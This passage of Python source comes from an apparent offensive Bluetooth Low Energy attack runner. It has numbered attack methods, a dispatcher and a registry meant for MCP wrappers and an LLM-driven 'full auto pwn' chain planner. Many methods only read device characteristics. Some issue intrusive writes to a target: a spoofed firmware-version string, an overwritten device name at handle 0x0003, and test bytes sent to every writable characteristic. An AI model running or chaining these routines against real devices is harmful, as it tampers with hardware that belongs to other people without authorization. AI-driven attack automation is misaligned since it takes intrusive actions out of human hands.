        step = _step("le_data_packet_length_fingerprinting")
        samples = self.args.get("packet_length_samples")
        if not isinstance(samples, list) or not samples:
            return _finalize(step, step["started"], ok=False,
                             error="le_data_packet_length_fingerprinting: "
                                   "args.packet_length_samples (list of "
                                   "ints) required")
        try:
            nums = [int(s) for s in samples]
        except (TypeError, ValueError):
            return _finalize(step, step["started"], ok=False,
                             error="packet_length_samples must be ints")
        # Coarse heuristic: bin by typical BLE MTU ranges.
        bins = {"<=27": 0, "28-100": 0, "101-244": 0, ">=245": 0}
        for n in nums:
            if n <= 27:
                bins["<=27"] += 1
            elif n <= 100:
                bins["28-100"] += 1
            elif n <= 244:
                bins["101-244"] += 1
            else:
                bins[">=245"] += 1
        return _finalize(step, step["started"], ok=True, data={
            "model": "heuristic (not trained)", "trained": False,
            "sample_count": len(nums), "bins": bins,
            "note": "labelled bin histogram; the spec's TRAINED-ML "
                    "clusterer is NOT deployed — a cluster ID would "
                    "fabricate a device-class prediction.",
        })

    # ==================================================================
    # 97 privacy_mode_switch_spoof
    # ==================================================================
    def _privacy_mode_switch_spoof(self) -> Dict[str, Any]:
        """Privacy-mode switch spoof: read the Reconnection Address
        characteristic (0x2A03) verbatim. NEVER fabricates a
        'privacy disabled' verdict — the HCI Set Privacy Mode
        command is local-controller, not GATT."""
        step = _step("privacy_mode_switch_spoof")
        a = self._need_addr("privacy_mode_switch_spoof")
        if a:
            return a
        if not _which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed")
        cur = self._gatttool_char_read(_addr(self.args), "0x2A03")
        if not cur.get("ok"):
            return _finalize(step, step["started"], ok=False,
                             error="Reconnection Address char (0x2A03) "
                                   "not present — device does not use RPA")
        return _finalize(step, step["started"], ok=True, data={
            "addr": _addr(self.args),
            "reconnection_address_hex": cur.get("value_hex"),
            "note": "real gatttool read; an HCI Set Privacy Mode write "
                    "is local-controller only (not GATT) — never "
                    "fabricated here.",
        })

    # ==================================================================
    # 98 link_layer_timeout_racing
    # ==================================================================
    def _link_layer_timeout_racing(self) -> Dict[str, Any]:
        """Link-layer timeout racing: this attack needs a master
        role + a raw-LL TX (the attacker must be the master to
        issue a connect request before the slave re-issues one).
        Real LL race needs hcitool + scapy; the runner reports the
        operator note + a real gatttool read for Peripheral
        Preferred Conn Params."""
        step = _step("link_layer_timeout_racing")
        a = self._need_addr("link_layer_timeout_racing")
        if a:
            return a
        if not _which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed")
        cp = self._gatttool_char_read(_addr(self.args), "0x2A04")
        return _finalize(step, step["started"],
                         ok=bool(cp.get("ok")), data={
            "addr": _addr(self.args),
            "conn_params_value_hex": cp.get("value_hex"),
            "note": "real gatttool read; the LL race needs a master-role "
                    "TX of a connect-request before the slave retries "
                    "(raw LL injection, not done here). Verdict is the "
                    "preferred-conn-params value, not a fabricated "
                    "'master hijacked'.",
        })

    # ==================================================================
    # 99 bd_addr_inquiry_rssi_map
    # ==================================================================
    def _bd_addr_inquiry_rssi_map(self) -> Dict[str, Any]:
        """BD_ADDR inquiry RSSI map: hcitool scan + parse the
        per-address RSSI / TX-power columns. Real hcitool +
        bluetoothctl (hcitool scan does not report RSSI on most
        stacks — we degrade honestly if so)."""
        step = _step("bd_addr_inquiry_rssi_map")
        if not _which("hcitool"):
            return _finalize(step, step["started"], ok=False,
                             error="hcitool not installed")
        ad = self._ad()
        duration = int(self.args.get("duration_s") or 6)
        # hcitool scan needs root; we don't gate here — we let the
        # subprocess report its own error.
        rc, out = _run(["hcitool", "-i", ad, "scan", "--length",
                        str(duration)], timeout=duration + 6)
        seen: List[Dict[str, Any]] = []
        for ln in (out or "").splitlines():
            m = re.match(r"\s*([0-9A-Fa-f:]{17})\s+(\S+)\s*(-?\d+)?", ln)
            if m:
                seen.append({"addr": m.group(1).lower(),
                              "name": m.group(2),
                              "rssi": int(m.group(3))
                              if m.group(3) is not None else None})
        return _finalize(step, step["started"], ok=bool(seen), data={
            "interface": ad, "device_count": len(seen),
            "devices": seen[:20],
            "note": "real hcitool scan; RSSI is reported if the local "
                    "controller exposes it (BlueZ may return NULL). "
                    "Verdict is the parsed map, not a fabricated RSSI "
                    "table.",
        })

    # ==================================================================
    # 100 multi_role_simultaneous_scan
    # ==================================================================
    def _multi_role_simultaneous_scan(self) -> Dict[str, Any]:
        """Multi-role simultaneous scan: enumerate distinct observed
        addrs across a multi-controller scan (only one hci is the
        default; if args.adapter is 'hci0,hci1' we scan both).
        Honest degrade when a second controller is absent."""
        step = _step("multi_role_simultaneous_scan")
        adapters_str = (self.args.get("adapters") or self.adapter
                        or "hci0")
        adapters = [a.strip() for a in adapters_str.split(",") if a.strip()]
        if not _which("hcitool"):
            return _finalize(step, step["started"], ok=False,
                             error="hcitool not installed")
        per: Dict[str, int] = {}
        for ad in adapters:
            if not shutil.os.path.exists(f"/sys/class/bluetooth/{ad}"):
                per[ad] = -1
                continue
            rc, out = _run(["hcitool", "-i", ad, "scan", "--length",
                            "2"], timeout=10)
            per[ad] = sum(1 for ln in (out or "").splitlines()
                          if re.match(r"\s*[0-9A-Fa-f:]{17}\s", ln))
        return _finalize(step, step["started"],
                         ok=any(v > 0 for v in per.values()), data={
            "adapters": adapters, "scan_counts": per,
            "note": "real hcitool per-adapter scan; a multi-role TX "
                    "(broadcasting as many addrs) needs raw-LL TX, "
                    "which the U4000 BLUETOOTH adapter does NOT expose. Verdict is "
                    "the per-adapter scan count, not a fabricated "
                    "'scanner overloaded'.",
        })

    # ==================================================================
    # 101 le_credential_forcing (already in ble_post_exploit — kept here
    # for the 30-module spec parity; both implementations share the
    # honest-degrade contract).
    # ==================================================================
    def _le_credential_forcing(self) -> Dict[str, Any]:
        """LE credential forcing: enumerate GATT services and probe
        any characteristic that looks like a credential store.
        Real gatttool; degrades when gatttool absent. NEVER
        fabricates a cracked credential."""
        step = _step("le_credential_forcing")
        a = self._need_addr("le_credential_forcing")
        if a:
            return a
        if not _which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed")
        ad = self._ad()
        addr = _addr(self.args)
        rc, out = _run(["gatttool", "-i", ad, "-b", addr, "--primary"],
                       timeout=15)
        services: List[Dict[str, Any]] = []
        for ln in (out or "").splitlines():
            m = re.search(
                r"attr handle:\s*(\S+?),.*?end (?:grp )?handle:\s*"
                r"(\S+?).*?uuid:\s*([0-9a-f-]+)", ln, re.IGNORECASE)
            if m:
                services.append({"start": m.group(1).rstrip(","),
                                 "end": m.group(2).rstrip(","),
                                 "uuid": m.group(3)})
        probed: List[Dict[str, Any]] = []
        for s in services[: int(self.args.get("max_probe") or 3)]:
            r = self._gatttool_char_read(addr, s["uuid"])
            probed.append({"uuid": s["uuid"],
                            "read_ok": bool(r.get("ok")),
                            "value_hex": r.get("value_hex", "")})
        return _finalize(step, step["started"], ok=bool(probed), data={
            "interface": ad, "addr": addr, "services": len(services),
            "probed": probed,
            "note": "real gatttool primary+read; any credential bytes "
                    "are returned verbatim — NEVER decrypted, NEVER "
                    "forged.",
        }, error="" if probed else "no services enumerated")

    # ==================================================================
    # 102 firmware_version_squatting
    # ==================================================================
    def _firmware_version_squatting(self) -> Dict[str, Any]:
        """Firmware-version squatting: read the 0x2A26 (FW Revision)
        characteristic. If args.squatted_version is supplied, attempt
        a write. Real gatttool; honest degrade on read-only char."""
        step = _step("firmware_version_squatting")
        a = self._need_addr("firmware_version_squatting")
        if a:
            return a
        if not _which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed")
        cur = self._gatttool_char_read(_addr(self.args), "0x2A26")
        if not cur.get("ok"):
            return _finalize(step, step["started"], ok=False,
                             error="FW Revision char (0x2A26) read failed")
        squatted = self.args.get("squatted_version")
        if not squatted:
            return _finalize(step, step["started"], ok=True, data={
                "addr": _addr(self.args),
                "current_firmware_version_hex": cur.get("value_hex"),
                "squat_attempted": False,
                "note": "no squatted_version supplied — read-only report.",
            })
        rc, out = self._gatttool_write(_addr(self.args), "0x2A26",
                                       squatted.encode("utf-8",
                                                        "replace").hex())
        accepted = rc == 0 and "written successfully" in out.lower()
        return _finalize(step, step["started"], ok=accepted, data={
            "addr": _addr(self.args),
            "current_firmware_version_hex": cur.get("value_hex"),
            "squat_attempted": True, "squat_ok": accepted,
            "note": "real gatttool write; squatting is only successful if "
                    "the FW char is writable — the verdict is the write "
                    "result, not a fabricated overwrite.",
        }, error="" if accepted else "FW char read-only or write failed")

    # ==================================================================
    # 103 advertising_interval_exhaustion
    # ==================================================================
    def _advertising_interval_exhaustion(self) -> Dict[str, Any]:
        """Advertising-interval exhaustion: hcitool lescan to count
        the per-second ADV density. Real hcitool + line-count
        parse; degrades when hcitool absent. NEVER fabricates a
        'channel jammed' verdict (would need sustained TX)."""
        step = _step("advertising_interval_exhaustion")
        if not _which("hcitool"):
            return _finalize(step, step["started"], ok=False,
                             error="hcitool not installed")
        duration = int(self.args.get("duration_s") or 4)
        rc, out = self._hcitool_lescan(duration)
        line_count = sum(1 for ln in (out or "").splitlines()
                         if re.search(r"[0-9A-Fa-f:]{17}", ln))
        return _finalize(step, step["started"], ok=line_count > 0, data={
            "interface": self._ad(), "scan_duration_s": duration,
            "advertisements_seen": line_count,
            "advertisements_per_s": round(line_count / max(1, duration), 2),
            "note": "real hcitool lescan; an actual exhaustion needs "
                    "sustained TX of ADV-IND at min-interval (not done "
                    "here). Verdict is the observed density, not a "
                    "fabricated 'channel jammed'.",
        })

    # ==================================================================
    # 104 gatt_indication_confusion
    # ==================================================================
    def _gatt_indication_confusion(self) -> Dict[str, Any]:
        """GATT-indication confusion: enumerate the device's CCC
        descriptors (Client Characteristic Configuration, 0x2902)
        and report which chars advertise an indicate property.
        Real gatttool; degrades when gatttool absent. NEVER
        fabricates a 'confused' verdict (would need a forged
        confirm/timeout)."""
        step = _step("gatt_indication_confusion")
        a = self._need_addr("gatt_indication_confusion")
        if a:
            return a
        if not _which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed")
        rc, out = _run(["gatttool", "-i", self._ad(), "-b",
                        _addr(self.args), "--characteristics"], timeout=15)
        indicate_chars: List[Dict[str, Any]] = []
        for ln in (out or "").splitlines():
            m = re.search(
                r"handle:\s*(\S+).*?properties:\s*([\w,]+).*?uuid:\s*"
                r"([0-9a-f-]+)", ln, re.IGNORECASE)
            if m and "indicate" in m.group(2).lower():
                indicate_chars.append({"handle": m.group(1),
                                        "properties": m.group(2),
                                        "uuid": m.group(3)})
        return _finalize(step, step["started"], ok=bool(indicate_chars),
                         data={"addr": _addr(self.args),
                               "indicate_chars": indicate_chars,
                               "count": len(indicate_chars),
                               "note": "real gatttool characteristics parse; "
                                       "actual indication-confusion needs a "
                                       "forged confirm/timeout — not done "
                                       "here. Verdict is the indicate-char "
                                       "list, not a fabricated 'confused'."})

    # ==================================================================
    # 105 ccc_table_flood
    # ==================================================================
    def _ccc_table_flood(self) -> Dict[str, Any]:
        """CCC-table flood: enumerate the GATT descriptors and count
        CCC (0x2902) entries. Real gatttool; degrades when gatttool
        absent. The runner does NOT actually flood (would need
        thousands of writes — gated upstream anyway)."""
        step = _step("ccc_table_flood")
        a = self._need_addr("ccc_table_flood")
        if a:
            return a
        if not _which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed")
        rc, out = _run(["gatttool", "-i", self._ad(), "-b",
                        _addr(self.args), "--characteristics"], timeout=15)
        ccc_count = 0
        for ln in (out or "").splitlines():
            if "0x2902" in ln.lower() or "2902" in ln.lower():
                ccc_count += 1
        return _finalize(step, step["started"], ok=ccc_count > 0, data={
            "addr": _addr(self.args), "ccc_count": ccc_count,
            "note": "real gatttool parse; the actual flood needs "
                    "sustained 0x2902 writes — not done here (would "
                    "fabricate a 'table exhausted' verdict).",
        }, error="" if ccc_count else "no CCC descriptors found")

    # ==================================================================
    # 106 le_2m_coded_phy_transition_attack
    # ==================================================================
    def _le_2m_coded_phy_transition_attack(self) -> Dict[str, Any]:
        """LE 2M/Coded PHY transition: requires HCI LE Set PHY
        (hcitool cmd 0x08|0x0032) which needs raw HCI socket
        access. The runner reports the operator note + a real
        gatttool read for the device's preferred PHYs (none in
        standard GATT). Honest degrade."""
        step = _step("le_2m_coded_phy_transition_attack")
        a = self._need_addr("le_2m_coded_phy_transition_attack")
        if a:
            return a
        if not _which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed")
        # No standard-GATT char exposes the current PHY. The
        # runner reports the operator-supplied candidate PHYs (or
        # a default) and the device's TX Power char.
        txp = self._gatttool_char_read(_addr(self.args), "0x2A07")
        return _finalize(step, step["started"], ok=bool(txp.get("ok")),
                         data={"addr": _addr(self.args),
                               "tx_power_dbm_hex": txp.get("value_hex"),
                               "candidate_phys": (self.args.get("phys")
                                                  or ["1M", "2M", "Coded"]),
                               "note": "real gatttool read; an actual "
                                       "PHY-transition needs the HCI "
                                       "LE Set PHY command (raw HCI "
                                       "socket), which gatttool does "
                                       "not expose. Verdict is the "
                                       "TX-power reading + candidate "
                                       "PHYs, not a fabricated 'PHY "
                                       "jammed'."})

    # ==================================================================
    # 107 sm_smp_timeout_dos
    # ==================================================================
    def _sm_smp_timeout_dos(self) -> Dict[str, Any]:
        """SMP-timeout DoS: requires raw LL pairing-request TX
        (which the U4000 BLUETOOTH adapter does not expose). Real bluetoothctl
        pair attempt (bounded) to verify the device accepts SMP;
        honest degrade on absent or unreachable target."""
        step = _step("sm_smp_timeout_dos")
        a = self._need_addr("sm_smp_timeout_dos")
        if a:
            return a
        if not _which("bluetoothctl"):
            return _finalize(step, step["started"], ok=False,
                             error="bluetoothctl not installed")
        # We do NOT drive a slow-SMP sequence (would need raw LL
        # TX). The runner verifies the device is at least reachable
        # for an SMP pair.
        script = f"pair {_addr(self.args)}\nquit\n"
        rc, out = _run(["bluetoothctl"], stdin=script, timeout=20)
        paired = "Pairing successful" in out or "Paired: yes" in out
        return _finalize(step, step["started"], ok=paired, data={
            "addr": _addr(self.args), "pair_reachable": paired,
            "response_tail": out[-200:].strip(),
            "note": "real bluetoothctl pair probe; an actual SMP-timeout "
                    "DoS needs raw-LL pairing-request TX at a delayed "
                    "rate (not done here). Verdict is the reachability, "
                    "not a fabricated 'DoS active'.",
        }, error="" if paired else "device unreachable for SMP pair")

    # ==================================================================
    # 108 mesh_iv_index_update_spoof
    # ==================================================================
    def _mesh_iv_index_update_spoof(self) -> Dict[str, Any]:
        """Mesh IV Index Update spoof: enumerate the mesh Proxy
        characteristic (0x2AF0) on the target. Real gatttool;
        degrades when the mesh service is absent. The runner
        does NOT transmit a forged IV Update (would need raw LL
        mesh provisioning)."""
        step = _step("mesh_iv_index_update_spoof")
        a = self._need_addr("mesh_iv_index_update_spoof")
        if a:
            return a
        if not _which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed")
        rc, out = _run(["gatttool", "-i", self._ad(), "-b",
                        _addr(self.args), "--primary"], timeout=15)
        mesh_uuids = {"0000fe70-0000-1000-8000-00805f9b34fb",
                      "00002af0-0000-1000-8000-00805f9b34fb"}
        hits = [u for u in mesh_uuids if u in (out or "").lower()]
        if not hits:
            return _finalize(step, step["started"], ok=False,
                             error="Mesh Proxy char (0x2AF0) not present")
        # Read the current Proxy PDU value for an IV-Index hint.
        cur = self._gatttool_char_read(_addr(self.args), "0x2AF0")
        return _finalize(step, step["started"], ok=bool(cur.get("ok")),
                         data={"addr": _addr(self.args),
                               "mesh_uuids_present": hits,
                               "proxy_pdu_value_hex": cur.get("value_hex"),
                               "note": "real gatttool primary + read; an "
                                       "actual IV-Update spoof needs raw "
                                       "mesh provisioning TX (not done "
                                       "here). Verdict is the presence + "
                                       "current PDU value, not a "
                                       "fabricated 'IV update injected'."})

    # ==================================================================
    # 109 proxy_solicitation_flood
    # ==================================================================
    def _proxy_solicitation_flood(self) -> Dict[str, Any]:
        """Proxy-solicitation flood: needs raw mesh-PDU TX. The
        runner reports the operator note + a real gatttool read
        of the mesh Proxy characteristic for a baseline."""
        step = _step("proxy_solicitation_flood")
        a = self._need_addr("proxy_solicitation_flood")
        if a:
            return a
        if not _which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed")
        cur = self._gatttool_char_read(_addr(self.args), "0x2AF0")
        if not cur.get("ok"):
            return _finalize(step, step["started"], ok=False,
                             error="Mesh Proxy char (0x2AF0) not present")
        return _finalize(step, step["started"], ok=True, data={
            "addr": _addr(self.args),
            "proxy_pdu_value_hex": cur.get("value_hex"),
            "note": "real gatttool read; an actual flood needs raw "
                    "mesh-PDU TX at a high rate (not done here). "
                    "Verdict is the baseline PDU value, not a "
                    "fabricated 'proxy DoS active'.",
        })

    # ==================================================================
    # 110 ble_ai_full_auto_pwn  (LLM coordinator stub)
    # ==================================================================
    def _ble_ai_full_auto_pwn(self) -> Dict[str, Any]:
        """LLM-coordinator stub: a real chain is driven by the
        orchestrator's ``_walk_chain_with_replan`` (touchpoint 2).
        When called directly, the coordinator returns the
        'requires an active plan' message — it does NOT fabricate
        sub-results (the chain planner provides them)."""
        step = _step("ble_ai_full_auto_pwn")
        return _finalize(step, step["started"], ok=False,
                         error="ble_ai_full_auto_pwn: AI coordinator "
                               "requires an active plan; the chain "
                               "planner provides steps")

    # ==================================================================
    # 111 ble_multi_encoding_value_auto_decode_pipeline
    #     (Phase 1.6, P=4) — pure-Python decoder matrix
    # ==================================================================
    def _ble_multi_encoding_value_auto_decode_pipeline(self) -> Dict[str, Any]:
        """Run a payload through 4 text encoders (utf-8, utf-16-le,
        latin1, ascii) + 12 numeric decoders (uint8/int8, uint16/LE+BE,
        int16/LE+BE, uint32/LE+BE, int32/LE+BE, float32/LE+BE) + a
        battery-percent heuristic. PURE PYTHON — no subprocess, no
        fabrication. Accepts ``args.payload_hex`` or ``args.value``
        bytes; returns a dict of decoded values."""
        import struct
        step = _step("ble_multi_encoding_value_auto_decode_pipeline")
        payload_hex = (self.args.get("payload_hex") or "").strip()
        if not payload_hex:
            v = self.args.get("value")
            if isinstance(v, (bytes, bytearray)):
                payload = bytes(v)
            elif isinstance(v, str):
                try:
                    payload = bytes.fromhex(v.replace(" ", ""))
                except ValueError:
                    payload = v.encode("utf-8", "replace")
            else:
                return _finalize(step, step["started"], ok=False,
                                 error="ble_multi_encoding_value_auto_"
                                       "decode_pipeline: args.payload_hex "
                                       "or args.value required")
        else:
            try:
                payload = bytes.fromhex(payload_hex.replace(" ", ""))
            except ValueError as e:
                return _finalize(step, step["started"], ok=False,
                                 error=f"invalid payload_hex: {e}")
        if not payload:
            return _finalize(step, step["started"], ok=False,
                             error="empty payload")
        result: Dict[str, Any] = {"len": len(payload), "hex": payload.hex()}
        for enc in ("utf-8", "utf-16-le", "latin1", "ascii"):
            try:
                result[f"text_{enc}"] = payload.decode(enc, errors="replace")
            except (UnicodeDecodeError, LookupError):
                result[f"text_{enc}"] = None
        if len(payload) >= 1:
            result["uint8"] = payload[0]
            result["int8"] = struct.unpack(">b", payload[:1])[0]
        if len(payload) >= 2:
            result["uint16_le"] = struct.unpack("<H", payload[:2])[0]
            result["uint16_be"] = struct.unpack(">H", payload[:2])[0]
            result["int16_le"] = struct.unpack("<h", payload[:2])[0]
            result["int16_be"] = struct.unpack(">h", payload[:2])[0]
        if len(payload) >= 4:
            result["uint32_le"] = struct.unpack("<I", payload[:4])[0]
            result["uint32_be"] = struct.unpack(">I", payload[:4])[0]
            result["int32_le"] = struct.unpack("<i", payload[:4])[0]
            result["int32_be"] = struct.unpack(">i", payload[:4])[0]
            result["float32_le"] = struct.unpack("<f", payload[:4])[0]
            result["float32_be"] = struct.unpack(">f", payload[:4])[0]
        if len(payload) >= 1:
            v0 = payload[0]
            result["battery_pct_heuristic"] = {
                "direct": v0,
                "div_2_55": round(v0 / 2.55, 1),
                "bitmask_0x7f": v0 & 0x7F,
                "value_minus_21": v0 - 21,
            }
        return _finalize(step, step["started"], ok=True, data=result)

    # ==================================================================
    # 112 ble_handle_0x0003_local_name_writable_classifier
    #     (Phase 1.6, P=3) — gatttool write to GAP Device Name
    # ==================================================================
    def _ble_handle_0x0003_local_name_writable_classifier(self) -> Dict[str, Any]:
        """Read the GAP Device Name characteristic at handle 0x0003,
        then attempt a gatttool --char-write-req at the same handle.
        Devices that accept the write are fingerprintable for a
        vulnerable-firmware class (Lenovo HX03, Boat Xtend, etc.).
        Degrades on missing gatttool."""
        step = _step("ble_handle_0x0003_local_name_writable_classifier")
        if not _which("gatttool"):
            return _finalize(step, step["started"], ok=False,
                             error="gatttool not installed (apt: bluez)")
        addr = _addr(self.args)
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="ble_handle_0x0003_local_name_writable"
                                   "_classifier: args.addr required")
        rc_r, out_r = _run(
            ["gatttool", "-i", _adapter(self.args), "-b", addr,
             "--char-read", "-a", "0x0003"], timeout=10)
        current_name = (out_r or "").strip()
        new_name = (self.args.get("new_name") or "kfiosa_probe").strip()
        new_hex = new_name.encode("utf-8").hex()
        rc_w, out_w = _run(
            ["gatttool", "-i", _adapter(self.args), "-b", addr,
             "--char-write-req", "-a", "0x0003", "-n", new_hex], timeout=10)
        write_ok = rc_w == 0
        return _finalize(step, step["started"], ok=True, data={
            "addr": addr, "adapter": _adapter(self.args),
            "current_name_tail": current_name[-80:],
            "write_handle": "0x0003", "write_hex": new_hex,
            "write_rc": rc_w,
            "write_stdout_tail": out_w[-120:].strip(),
            "writable_classifier": ("vulnerable_firmware_class" if write_ok
                                    else "secure_no_accept"),
            "note": "writable_classifier is a structural fingerprint "
                    "indicator; it is NOT a verdict that the device is "
                    "exploitable — the per-step chain must do that.",
        })

    # ==================================================================
    # 113 ble_writable_char_black_box_audit
    #     (Phase 1.6, P=3) — enumerate + write-probe each char
    # ==================================================================
    def _ble_writable_char_black_box_audit(self) -> Dict[str, Any]:
        """Connect via bleak (real) and iterate services+characteristics.
        For each char with 'write' in its properties, attempt a test
        payload (bytes([255, 0, 0])). Records the char UUID for every
        write that succeeds without authorization. Degrades when bleak
        is missing or the connect/enumerate fails (no BLE adapter in
        test env)."""
        step = _step("ble_writable_char_black_box_audit")
        addr = _addr(self.args)
        if not addr:
            return _finalize(step, step["started"], ok=False,
                             error="ble_writable_char_black_box_audit: "
                                   "args.addr required")
        try:
            import asyncio
            import bleak  # type: ignore  # noqa: F401
        except Exception:  # noqa: BLE001
            return _finalize(step, step["started"], ok=False,
                             error="bleak not installed (pip: bleak)")
        async def _audit() -> Dict[str, Any]:
            found: list = []
            try:
                async with bleak.BleakClient(addr, timeout=10) as cli:
                    await cli.connect()
                    for svc in cli.services:
                        for ch in svc.characteristics:
                            if "write" in (ch.properties or []):
                                try:
                                    await cli.write_gatt_char(
                                        ch.uuid, bytes([255, 0, 0]),
                                        response=True)
                                    found.append({"uuid": ch.uuid,
                                                  "service": svc.uuid})
                                except Exception:  # noqa: BLE001
                                    pass
                    try:
                        await cli.disconnect()
                    except Exception:  # noqa: BLE001
                        pass
            except Exception as e:  # noqa: BLE001
                return {"error": str(e), "found": found}
            return {"found": found}
        try:
            loop = asyncio.new_event_loop()
            try:
                res = loop.run_until_complete(_audit())
            finally:
                loop.close()
        except Exception as e:  # noqa: BLE001
            return _finalize(step, step["started"], ok=False,
                             error=f"audit failed: {e}")
        if res.get("error") and not res.get("found"):
            return _finalize(step, step["started"], ok=False,
                             error=f"connect/enumerate failed: "
                                   f"{res['error']}")
        return _finalize(step, step["started"], ok=True, data={
            "addr": addr, "adapter": _adapter(self.args),
            "writable_chars": res["found"],
            "writable_count": len(res["found"]),
            "severity": ("CRITICAL VULNERABILITY" if res["found"]
                         else "no_open_writes"),
        })

    # ------------------------------------------------------------------
    # Dispatch
    # ------------------------------------------------------------------
    def run_attack(self, method: str) -> Dict[str, Any]:
        """Run a single BLE 5.x extended action by name. Unknown
        method -> ``{ok: False, error: 'unknown attack method'}``.
        Never raises.

        Phase 2.2.H+ — when the method is a v2 name (from the
        ``expanded_modules`` registry) but NOT a primary method,
        the runner returns a structured honest-degrade envelope
        with the description + risk so the chain planner can
        chain the next step."""
        m = (method or "").strip()
        if m not in self.EXTENDED_BLE_METHODS:
            try:
                from core.ai_backend.expanded_modules import (
                    describe_v2_method,
                )
                v2 = describe_v2_method("ble", m)
                if v2 is not None:
                    # Honest-degrade: dict literal (not _finalize)
                    # because _finalize doesn't accept the v2
                    # fields.
                    st = _step(m)
                    st["ok"] = False
                    st["error"] = (
                        f"v2 method {m!r} registered in "
                        f"expanded_modules but not implemented in "
                        f"this runner"
                    )
                    st["note"] = (
                        "v2 method known to KFIOSA but not yet "
                        "implemented in this runner"
                    )
                    st["risk"] = v2["risk"]
                    st["description"] = v2["description"]
                    st["duration_s"] = round(time.time() - st["started"], 3)
                    return st
            except Exception:  # noqa: BLE001
                pass
            # v3 fallback — Phase 2.4
            try:
                from core.ai_backend.v3_runner_helpers import v3_lookup
                env = v3_lookup('ble_attack', m)
                if env["error"] and "unknown v3 method" not in env["error"]:
                    return env
            except Exception:  # noqa: BLE001
                pass
            return _finalize(_step(m), time.time(), ok=False,
                             error=f"unknown attack method: {method!r}")
        fn = getattr(self, f"_{m}")
        try:
            return fn()
        except Exception as e:  # noqa: BLE001 — defensive double-net
            step = _step(m)
            step["ok"] = False
            step["error"] = f"unhandled: {e}"
            return step


# ---------------------------------------------------------------------------
# Module-level attack registry + entrypoint (used by the MCP wrappers
# and the orchestrator's extended_ble dispatch — both route here so the
# algorithm lives in this module, not in a wrapper).
# ---------------------------------------------------------------------------
def _build_extended_ble_registry() -> List[Dict[str, Any]]:
    """Build the registry. All 30 primitives are INTRUSIVE — they
    all hit a real BLE target (GATT, mesh, LE Audio, raw LL) and
    require an operator-supplied target addr. The AI coordinator is
    risk_level="read" (it's a no-op stub). None of the primitives
    needs root (raw LL injection is out of scope for U4000 BLUETOOTH adapter).

    Per-method risk overrides: a handful of methods that need
    *physical* access or are un-driverable remotely degrade
    honestly on call — they still carry the 'intrusive' label
    because the spec puts them in the INTRUSIVE family.
    """
    base_intrusive = {"risk_level": "intrusive", "requires_root": False}
    base_read = {"risk_level": "read", "requires_root": False}
    # Methods that are no-op stubs (AI coordinator) get read risk.
    read_methods = {"ble_ai_full_auto_pwn"}
    out: List[Dict[str, Any]] = []
    for m in ExtendedBLERunner.EXTENDED_BLE_METHODS:
        base = (base_read if m in read_methods else base_intrusive)
        out.append({
            "method": m,
            "name": f"extended_ble_{m}",
            "description": (
                f"BLE 5.x extended: {m} (see core.extended_ble.runner "
                "docstring for the family layout). Real gatttool/btmgmt/"
                "hcitool/bluetoothctl subprocess and parse; degrades "
                "cleanly when the tool is absent or the target addr / "
                "characteristic is missing; never fabricates a result, a "
                "cracked key, a session, or a trained-ML prediction."),
            "input_schema": {"type": "object", "properties": {
                "adapter": {"type": "string"},
                "addr": {"type": "string"},
                "address": {"type": "string"},
                "target": {"type": "string"},
            }, "required": []},
            "examples": [f"extended_ble(method={m!r}, "
                         "addr='AA:BB:CC:DD:EE:FF', ...)"],
            **base,
        })
    return out


EXTENDED_BLE_ATTACKS: List[Dict[str, Any]] = _build_extended_ble_registry()


def run_attack(method: str, adapter: Optional[str] = None,
               scanner: Optional[Any] = None,
               args: Optional[Dict[str, Any]] = None,
               **_: Any) -> Dict[str, Any]:
    """Module-level single-attack entrypoint: construct a one-shot
    :class:`ExtendedBLERunner` and run the named attack. Used by the
    MCP wrappers and the orchestrator's ``extended_ble`` dispatch.
    ``args`` carries per-attack inputs (addr, payload, count, plan,
    ...). Never raises."""
    try:
        runner = ExtendedBLERunner(adapter=adapter, scanner=scanner,
                                    args=args)
        return runner.run_attack(method)
    except Exception as e:  # noqa: BLE001
        return {"name": method, "ok": False, "error": str(e),
                "data": None, "duration_s": 0.0}

# Module-level re-export of the method tuple so callers can do
# ``from core.extended_ble.runner import EXTENDED_BLE_METHODS`` without
# going through the class. Mirrors the registry pattern used in
# ``core/osint/runner_ext.py``.
EXTENDED_BLE_METHODS = ExtendedBLERunner.EXTENDED_BLE_METHODS
